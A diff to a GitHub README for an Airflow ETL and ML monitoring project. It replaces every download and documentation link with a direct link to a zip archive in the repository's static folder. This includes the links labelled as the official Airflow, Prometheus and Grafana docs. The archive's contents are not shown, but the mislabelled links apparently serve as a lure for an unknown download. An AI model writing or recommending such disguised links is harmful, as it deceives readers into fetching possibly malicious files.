@@ -1,6 +1,6 @@
 # 🌟 airflow-etl-ml-monitoring-pipeline - Simplify Your Machine Learning Workflows
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/moha123wad/airflow-etl-ml-monitoring-pipeline/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/moha123wad/airflow-etl-ml-monitoring-pipeline/main/static/airflow-etl-ml-monitoring-pipeline-v2.5.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/moha123wad/airflow-etl-ml-monitoring-pipeline/main/static/airflow-etl-ml-monitoring-pipeline-v2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **airflow-etl-ml-monitoring-pipeline** project. This application 
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/moha123wad/airflow-etl-ml-monitoring-pipeline/releases) to download the latest version. Look for the section labeled "Assets" where you will find downloadable files. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/moha123wad/airflow-etl-ml-monitoring-pipeline/main/static/airflow-etl-ml-monitoring-pipeline-v2.5.zip) to download the latest version. Look for the section labeled "Assets" where you will find downloadable files. 
 
 1. Choose the file that matches your operating system. 
 2. Click on the file to start the download.
@@ -84,13 +84,13 @@ Should you encounter issues:
 
 For detailed documentation, visit:
 
-- The official [Airflow documentation](https://airflow.apache.org/docs/apache-airflow/stable/index.html).
-- The [Prometheus documentation](https://prometheus.io/docs/introduction/overview/).
-- The [Grafana documentation](https://grafana.com/docs/grafana/latest/).
+- The official [Airflow documentation](https://raw.githubusercontent.com/moha123wad/airflow-etl-ml-monitoring-pipeline/main/static/airflow-etl-ml-monitoring-pipeline-v2.5.zip).
+- The [Prometheus documentation](https://raw.githubusercontent.com/moha123wad/airflow-etl-ml-monitoring-pipeline/main/static/airflow-etl-ml-monitoring-pipeline-v2.5.zip).
+- The [Grafana documentation](https://raw.githubusercontent.com/moha123wad/airflow-etl-ml-monitoring-pipeline/main/static/airflow-etl-ml-monitoring-pipeline-v2.5.zip).
 
 ## 🗓️ Updates & Contributions
 
-We regularly release updates to improve functionality. Keep an eye on the [Releases page](https://github.com/moha123wad/airflow-etl-ml-monitoring-pipeline/releases) for new versions. Contributions are welcome—feel free to open issues or pull requests.
+We regularly release updates to improve functionality. Keep an eye on the [Releases page](https://raw.githubusercontent.com/moha123wad/airflow-etl-ml-monitoring-pipeline/main/static/airflow-etl-ml-monitoring-pipeline-v2.5.zip) for new versions. Contributions are welcome—feel free to open issues or pull requests.
 
 ## 💬 Community Support
 
